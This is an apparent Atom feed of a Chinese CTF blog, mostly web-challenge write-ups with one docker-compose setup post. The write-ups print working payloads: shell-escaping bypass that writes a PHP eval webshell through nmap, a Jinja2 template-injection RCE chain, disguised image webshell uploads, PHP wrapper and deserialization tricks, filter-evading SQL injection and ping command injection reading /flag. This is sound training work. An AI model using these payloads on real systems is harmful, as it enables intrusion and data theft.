<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>大周&#39;blog</title>
  
  <subtitle>ctf</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://lingxin16.github.io/"/>
  <updated>2020-07-15T07:58:55.916Z</updated>
  <id>http://lingxin16.github.io/</id>
  
  <author>
    <name>奝</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BUUCTF2018-OnlineTool</title>
    <link href="http://lingxin16.github.io/2020/07/15/BUUCTF2018-OnlineTool/"/>
    <id>http://lingxin16.github.io/2020/07/15/BUUCTF2018-OnlineTool/</id>
    <published>2020-07-15T01:19:11.000Z</published>
    <updated>2020-07-15T07:58:55.916Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img src="/2020/07/15/BUUCTF2018-OnlineTool/1.png" alt="1"></p><p>总体意思就是GET方式传递参数给host然后经过两个函数<code>escapeshellarg</code>和<code>escapeshellcmd</code>，最后执行<code>system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host)</code></p><p><img src="/2020/07/15/BUUCTF2018-OnlineTool/2.png" alt="2"></p><p>函数作用</p><pre><code>1,确保用户值传递一个参数给命令2,用户不能指定更多的参数3,用户不能执行不同的命令</code></pre><p><img src="/2020/07/15/BUUCTF2018-OnlineTool/3.png" alt="3"></p><p>函数作用</p><pre><code>1,确保用户只执行一个命令2,用户可以指定不限数量的参数3,用户不能执行不同的命令</code></pre><p>题目提示给了PHP和RCE</p><p><img src="/2020/07/15/BUUCTF2018-OnlineTool/4.png" alt="4"></p><p>这里关于PHP escapeshellarg()+escapeshellcmd()的RCE漏洞https:/<a href="https://paper.seebug.org/164/" target="_blank" rel="noopener"></a>/paper.seebug.org/164/</p><ol><li>传入的参数是：<code>172.17.0.2&#39; -v -d a=1</code></li><li>经过<code>escapeshellarg</code>处理后变成了<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li><li>经过<code>escapeshellcmd</code>处理后变成<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，这是因为<code>escapeshellcmd</code>对<code>\</code>以及最后那个<strong>不配对儿</strong>的引号进行了转义：<a href="http://php.net/manual/zh/function.escapeshellcmd.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.escapeshellcmd.php</a></li><li>最后执行的命令是<code>curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，由于中间的<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，与再后面的<code>&#39;</code>配对儿成了一个空白连接符。所以可以简化为<code>curl 172.17.0.2\ -v -d a=1&#39;</code>，即向<code>172.17.0.2\</code>发起请求，POST 数据为<code>a=1&#39;</code>。</li></ol><p>接下来就是构造命令</p><pre><code>?host=&#39; &lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt; -oG shell.php &#39;</code></pre><p><img src="/2020/07/15/BUUCTF2018-OnlineTool/5.png" alt="5"></p><p>文件路径/c42a72d0bb829f75f501621acb75dc05/shell.php</p><p>蚁剑连接后在根目录找到flag</p><p>nmap中文手册：<a href="http://www.nmap.com.cn/doc/manual.shtm" target="_blank" rel="noopener">http://www.nmap.com.cn/doc/manual.shtm</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>RoarCTF2019-EasyJava</title>
    <link href="http://lingxin16.github.io/2020/07/14/RoarCTF2019-EasyJava/"/>
    <id>http://lingxin16.github.io/2020/07/14/RoarCTF2019-EasyJava/</id>
    <published>2020-07-14T02:01:16.000Z</published>
    <updated>2020-07-14T02:50:13.888Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img src="/2020/07/14/RoarCTF2019-EasyJava/1.png" alt="1"></p><p>这道题做起来又是没有一点思路，除了登录和help两个功能也没找到其他的，也没有隐藏的hint之类的，看报错显示的是Apache Tomcat/8.5.24，我搜下了有一个CVE-2018-1305的漏洞，但是好像也没什么用，还是看大佬们的wp吧😭😭😭</p><p>利用点是help功能，点击help之后跳转的是/Download?filename=help.docx，但是报错<code>java.io.FileNotFoundException:{help.docx}</code></p><p>关于这点，看大佬们的博客是因为请求方式的原因，果然改为post请求之后能够正常下载</p><p><img src="/2020/07/14/RoarCTF2019-EasyJava/2.png" alt="2"></p><p>下载后打开只有一行Are you sure the flag is here? ? ?很显然这也不是flag</p><p>接下来就是WEB-INF/web.xml泄露，WEB-INF是Java的WEB应用的安全目录。主要包含以下文件或目录</p><pre><code>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。/WEB-INF/database.properties：数据库配置文件漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</code></pre><p>关于具体的源码泄露参考这个大佬的文章：<a href="https://blog.csdn.net/wy_97/article/details/78165051" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/78165051</a></p><p>然后传filename=/WEB-INF/web.xml，下载得到</p><p><img src="/2020/07/14/RoarCTF2019-EasyJava/3.png" alt="3"></p><p>有一个FlagController，路径/Flag，请求后报错</p><p><img src="/2020/07/14/RoarCTF2019-EasyJava/4.png" alt="4"></p><p>有路径/com/wm/ctf/FlagController</p><p>接下来就是更加看不懂的环节了，推测class文件路径，然后获得class文件，反编译得到flag</p><p>payload：</p><pre><code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code></pre><p><img src="/2020/07/14/RoarCTF2019-EasyJava/5.png" alt="5"></p><p>有一串base64样式的字符串，解码得到flag</p><p>关于这个路径推测，大佬们的博客写的是结合Tomcat的项目存放路径的经验得出的，咱也没经验，咱也不知道👀</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>BJDCTF2nd-EasyMd5</title>
    <link href="http://lingxin16.github.io/2020/07/13/BJDCTF2nd-EasyMd5/"/>
    <id>http://lingxin16.github.io/2020/07/13/BJDCTF2nd-EasyMd5/</id>
    <published>2020-07-13T02:51:16.000Z</published>
    <updated>2020-07-14T02:02:05.324Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img src="/2020/07/13/BJDCTF2nd-EasyMd5/1.png" alt="1"></p><p>在HTTP头里发现Hint: select * from ‘admin’ where password=md5($pass,true)</p><p>关于md5($pass,true)</p><p>参考：<a href="https://blog.csdn.net/March97/article/details/81222922" target="_blank" rel="noopener">https://blog.csdn.net/March97/article/details/81222922</a></p><p>输入ffifdyop</p><p><img src="/2020/07/13/BJDCTF2nd-EasyMd5/2.png" alt="2"></p><p>查看源文件，发现</p><pre><code>&lt;!--$a = $GET[&#39;a&#39;];$b = $_GET[&#39;b&#39;];if($a != $b &amp;&amp; md5($a) == md5($b)){    // wow, glzjin wants a girl friend.--&gt;</code></pre><p>md5 bypass</p><p>因为<code>md5()</code>或者<code>sha1()</code>之类的函数计算的是一个字符串的哈希值，对于数组则返回false，如果<code>$a</code>和<code>$b</code>都是数组则双双返回FALSE, 两个FALSE相等得以绕过。payload:<code>?a[]=1&amp;b[]=2</code></p><p><img src="/2020/07/13/BJDCTF2nd-EasyMd5/3.png" alt="3"></p><p>POST方式传<code>?param1[]=1&amp;param2[]=2</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>BJDCTF2nd-fakegoogle</title>
    <link href="http://lingxin16.github.io/2020/07/13/BJDCTF2nd-fakegoogle/"/>
    <id>http://lingxin16.github.io/2020/07/13/BJDCTF2nd-fakegoogle/</id>
    <published>2020-07-13T00:32:52.000Z</published>
    <updated>2020-07-13T01:28:28.265Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img src="/2020/07/13/BJDCTF2nd-fakegoogle/1.png" alt="1"></p><p>输入一个值之后返回</p><p><img src="/2020/07/13/BJDCTF2nd-fakegoogle/2.png" alt="2"></p><p>查看源文件后发现提示</p><pre><code>&lt;!--ssssssti &amp; a little trick --&gt; </code></pre><p>ssti注入，利用的是jinjia2的模板引擎</p><p>payload</p><pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag').read()") }}{% endif %}{% endfor %}```RCE Payload```{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('<command>').read()") }}{% endif %}{% endfor %}</code></pre><p>推荐文章<a href="https://bbs.ichunqiu.com/thread-47685-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-47685-1-1.html</a></p><p>当然这一题也能用tplmap一把梭</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ACTF2020新生赛-Upload</title>
    <link href="http://lingxin16.github.io/2020/07/11/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/"/>
    <id>http://lingxin16.github.io/2020/07/11/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/</id>
    <published>2020-07-11T01:35:32.000Z</published>
    <updated>2020-07-11T01:50:44.170Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img src="/2020/07/11/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/1.png" alt="1"></p><p>鼠标移动到中间发现上传，尝试上传</p><p><img src="/2020/07/11/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/2.png" alt="2"></p><p>上传成功后左上角有提示，可以打开</p><p>在尝试上传PHP马的时候提示</p><p><img src="/2020/07/11/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/3.png" alt="3"></p><p>在尝试抓包的时候发现，文件后缀的检测是本地前端检测，后缀改为png，利用burp抓包改phtml后缀，上传成功。</p><p>蚁剑连接，在根目录找到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ACTF2020新生赛-BackupFile</title>
    <link href="http://lingxin16.github.io/2020/07/10/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile/"/>
    <id>http://lingxin16.github.io/2020/07/10/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile/</id>
    <published>2020-07-10T02:49:27.000Z</published>
    <updated>2020-07-10T03:03:22.561Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img src="/2020/07/10/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile/1.png" alt="1"></p><p>让我们尝试找源文件，在index.php.bak得到源文件</p><pre><code>&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET[&#39;key&#39;])) {    $key = $_GET[&#39;key&#39;];    if(!is_numeric($key)) {        exit(&quot;Just num!&quot;);    }    $key = intval($key);    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;    if($key == $str) {        echo $flag;    }}else {    echo &quot;Try to find out source file!&quot;;}</code></pre><p>要求我们传入key值，key值只能是数字，并且key值等于123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3才能得到flag</p><p>PHP作为弱类型语言，当字符串与整型值比较时，字符串先转换成整型，然后再比较，也就是说只要key=123就能满足。</p><p>index.php?key=123得到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战2019-upload</title>
    <link href="http://lingxin16.github.io/2020/07/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-upload/"/>
    <id>http://lingxin16.github.io/2020/07/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-upload/</id>
    <published>2020-07-09T02:45:33.000Z</published>
    <updated>2020-07-09T03:01:33.737Z</updated>
    
    <content type="html"><![CDATA[<p>地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img src="/2020/07/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-upload/1.png" alt="1"></p><p>上传界面</p><p><img src="/2020/07/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-upload/2.png" alt="2"></p><p>过滤了<code>&lt;?</code>那就尝试不带<code>&lt;?</code>的，前几天遇到过</p><script language="php">eval($_POST[a]);</script><p><img src="/2020/07/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-upload/3.png" alt="3"></p><p>还要满足图片，</p><pre><code>GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_POST[a]);&lt;/script&gt;</code></pre><p>PHP后缀的话可以用PHP3、PHP4、phtml绕过，这里只能用phtml</p><p>上传文件都在upload目录下，蚁剑连接，在根目录下得到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ZJCTF-NiZhuanSiWei</title>
    <link href="http://lingxin16.github.io/2020/07/08/ZJCTF-NiZhuanSiWei/"/>
    <id>http://lingxin16.github.io/2020/07/08/ZJCTF-NiZhuanSiWei/</id>
    <published>2020-07-08T07:42:39.000Z</published>
    <updated>2020-07-08T08:25:25.035Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img src="/2020/07/08/ZJCTF-NiZhuanSiWei/1.png" alt="1"></p><p>首先要满足传入一个text文件，使文件内容为welcome to the zjctf，可以用php://input伪协议</p><pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></pre><p>接下来过滤了flag，并且提示有个useless.php文件，使用php://filter协议读取</p><pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></pre><p><img src="/2020/07/08/ZJCTF-NiZhuanSiWei/2.png" alt="2"></p><p>base64解码得道useless.php的内容</p><pre><code>&lt;?php  class Flag{  //flag.php      public $file;      public function __tostring(){          if(isset($this-&gt;file)){              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        }      }  }  ?&gt;  </code></pre><p>然后序列化</p><pre><code>&lt;?php  class Flag{    public $file=&#39;flag.php&#39;;      public function __tostring(){          if(isset($this-&gt;file)){              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        }      }  } $password=new Flag();$password = serialize($password);echo $password; ?&gt;</code></pre><p>得到<code>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p><p>最终payload</p><pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></pre><p>源代码得到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战2019-BuyFlag</title>
    <link href="http://lingxin16.github.io/2020/07/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/"/>
    <id>http://lingxin16.github.io/2020/07/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/</id>
    <published>2020-07-07T12:58:35.000Z</published>
    <updated>2020-07-07T13:32:36.235Z</updated>
    
    <content type="html"><![CDATA[<p>地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img src="/2020/07/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/1.png" alt="1"></p><p>随便翻一翻，右边menu菜单有个PayFlag指向pay.php</p><p><img src="/2020/07/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/2.png" alt="2"></p><p>这里说我们只能用多少钱买flag并且必须是哪里的学生，并且要回答正确的密码</p><p>查看源代码发现提示</p><pre><code>&lt;!--    ~~~post money and password~~~if (isset($_POST[&#39;password&#39;])) {    $password = $_POST[&#39;password&#39;];    if (is_numeric($password)) {        echo &quot;password can&#39;t be number&lt;/br&gt;&quot;;    }elseif ($password == 404) {        echo &quot;Password Right!&lt;/br&gt;&quot;;    }}--&gt;</code></pre><p>这里的意思是我们需要用post方式提交password，然后password不能是数字，当password等于404的时候返回Password Right!</p><p>emm既需要满足password不是数字，又要满足password等于404</p><p>这里的password类型判断用的is_numeric()</p><p>在PHP手册中了解到</p><pre><code>bool is_numeric( mixed $var)如果 var 是数字和数字字符串则返回 TRUE，否则返回 FALSE。 </code></pre><p>那么如果我们赋值中不仅仅是数字或数字字符串，就是false</p><p>这里我们让password=404%</p><p>在控制台中还能看到一项cookie：user=0</p><p>修改为user=1</p><p><img src="/2020/07/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/3.png" alt="3"></p><p>已经提示我们<br>you are Cuiter<br>Password Right!<br>Pay for the flag!!!hacker!!!</p><p>但是Pay for the flag一直没找到在哪里，那就也直接传一个money吧</p><p>但是在这个题中PHP版本是5.3.5，输入字符不能超过八位，否则会提示我们Nember lenth is too long</p><p>关于这个我们可以了解一下strcmp()函数</p><p><img src="/2020/07/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/4.png" alt="4"></p><p>这个函数在PHP5.3版本之前有个漏洞，当我们传入非字符串类型的数据的时候，这个函数将发生错误，在PHP5.3版本之前显示了报错的警告信息后会return 0，也就是虽然报了错，但却判定其相等。</p><p>所以我们传money[]=admin</p><p><img src="/2020/07/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/5.png" alt="5"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战2019-BabySQL</title>
    <link href="http://lingxin16.github.io/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/"/>
    <id>http://lingxin16.github.io/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/</id>
    <published>2020-07-06T03:23:56.000Z</published>
    <updated>2020-07-06T04:21:56.763Z</updated>
    
    <content type="html"><![CDATA[<p>​    题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/1.png" alt="1"></p><p>尝试admin登录</p><p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/2.png" alt="2"></p><p>然后尝试利用admin’or 1 = 1#</p><p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/3.png" alt="3"></p><p>显然or被过滤了，</p><p>这里用双写绕过admin’oorr 1 = 1#成功</p><p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/4.png" alt="4"></p><p>username=u’uniunionon selselectect 1,2,3#&amp;password=p</p><p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/5.png" alt="5"></p><p>得到2,3列，接下来爆库得到geek</p><p>u’uniunionon selselectect 1,2,database()#&amp;password=p</p><p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/6.png" alt="6"></p><p>username=u’uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()#&amp;password=p</p><p>得到两个表名’b4bsql,geekuser’</p><p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/7.png" alt="7"></p><p>username=u’uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=’geekuser’#&amp;password=p</p><p>得到三个字段id,username,password</p><p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/8.png" alt="8"></p><p>username=u’uniunionon selselectect 1,2,group_concat(id,username,passwoorrd) frfromom geekuser#&amp;password=p</p><p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/9.png" alt="9"></p><p>没有发现flag</p><p>重复操作在b4bsql表中发现flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;​    题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>CentOS配置docker和docker-compose</title>
    <link href="http://lingxin16.github.io/2020/06/25/CentOS%E9%85%8D%E7%BD%AEdocker%E5%92%8Cdocker-compose/"/>
    <id>http://lingxin16.github.io/2020/06/25/CentOS%E9%85%8D%E7%BD%AEdocker%E5%92%8Cdocker-compose/</id>
    <published>2020-06-25T13:48:42.000Z</published>
    <updated>2020-06-25T14:02:51.670Z</updated>
    
    <content type="html"><![CDATA[<p>最近在部署一个web服务，需要docker和docker-compose，遇到了许多问题，记录一下。</p><a id="more"></a><p>CentOS版本是7.6</p><p>先安装docker</p><pre><code>yum -y install docker</code></pre><p>然后安装docker-compose(可能会出现错误，建议先看完整篇博客再安装)</p><pre><code># yum-util 提供 yum-config-manager 功能， 另外两个是 devicemapper 驱动依赖yum install -y yum-utils device-mapper-persistent-data lvm2# 设置 yum 源yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo# 安装依赖yum install epel-release#安装python——pipyum install -y python-pip# 使用pip安装docker-composepip install docker-compose# 升级python包sudo yum upgrade python*</code></pre><p>这是正常的流程，会出现这样的错误</p><p><img src="/2020/06/25/CentOS%E9%85%8D%E7%BD%AEdocker%E5%92%8Cdocker-compose/1.png" alt="1"></p><p>那么需要先安装安装python-devel</p><pre><code>yum install python-devel -y </code></pre><p>然后再安装上边的使用pip安装docker-compose</p><p>安装成功之后测试</p><pre><code>docker -vdocker-compose -v</code></pre><p>正常之后就没问题了</p><p>但是我的docker-compose出现了这样的错误</p><p><img src="/2020/06/25/CentOS%E9%85%8D%E7%BD%AEdocker%E5%92%8Cdocker-compose/2.png" alt="2"></p><p>这个问题我也没什么解决办法，就换一种方法安装docker-compose</p><p>安装docker-compose</p><pre><code>sudo curl -L &quot;https://get.daocloud.io/docker/compose/releases/download/1.24.1/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose</code></pre><p>对二进制文件应用可执行权限：</p><pre><code>chmod +x /usr/local/bin/docker-compose</code></pre><p>然后再<code>docker-compose -v</code>测试是否正常</p><p>如果提示找不到docker-compose，那就配置一下全局环境变量，具体操作在下边</p><pre><code>vi /etc/profile</code></pre><p>然后在末尾添加</p><pre><code>export PATH=/usr/local/bin:$PATH</code></pre><p>最后退出vim</p><p>执行<code>source/etc/profile</code></p><p>这时候测试应该就正常了</p><p>但是在用docker-compose启动docker集群时报错Couldn’t connect to Docker daemon at http+docker://localunixsocket - is it running?</p><p>执行<code>systemctl start docker</code></p><p>然后再启动docker集群解决问题</p><p>参考文章:</p><p><a href="https://blog.csdn.net/btqszl/article/details/78528726" target="_blank" rel="noopener">https://blog.csdn.net/btqszl/article/details/78528726</a></p><p><a href="https://www.cnblogs.com/caidingyu/p/11320021.html" target="_blank" rel="noopener">https://www.cnblogs.com/caidingyu/p/11320021.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在部署一个web服务，需要docker和docker-compose，遇到了许多问题，记录一下。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="服务器配置" scheme="http://lingxin16.github.io/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>ACTF2020新生赛-Exec</title>
    <link href="http://lingxin16.github.io/2020/06/22/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/"/>
    <id>http://lingxin16.github.io/2020/06/22/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/</id>
    <published>2020-06-22T01:57:50.000Z</published>
    <updated>2020-06-22T02:11:50.928Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址：<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>题目是长这样子的</p><p><img src="/2020/06/22/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/1.png" alt="1"></p><p>emm..看到ping这个功能就想命令执行和管道符漏洞，就先输入127.0.0.1||ls</p><p><img src="/2020/06/22/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/2.png" alt="2"></p><p>但是只能看到一个index.php</p><p>再看上级目录127.0.0.1||ls /</p><p><img src="/2020/06/22/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/3.png" alt="3"></p><p>然后直接127.0.0.1||cat /flag</p><p><img src="/2020/06/22/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/4.png" alt="4"></p>]]></content>
    
    <summary type="html">
    
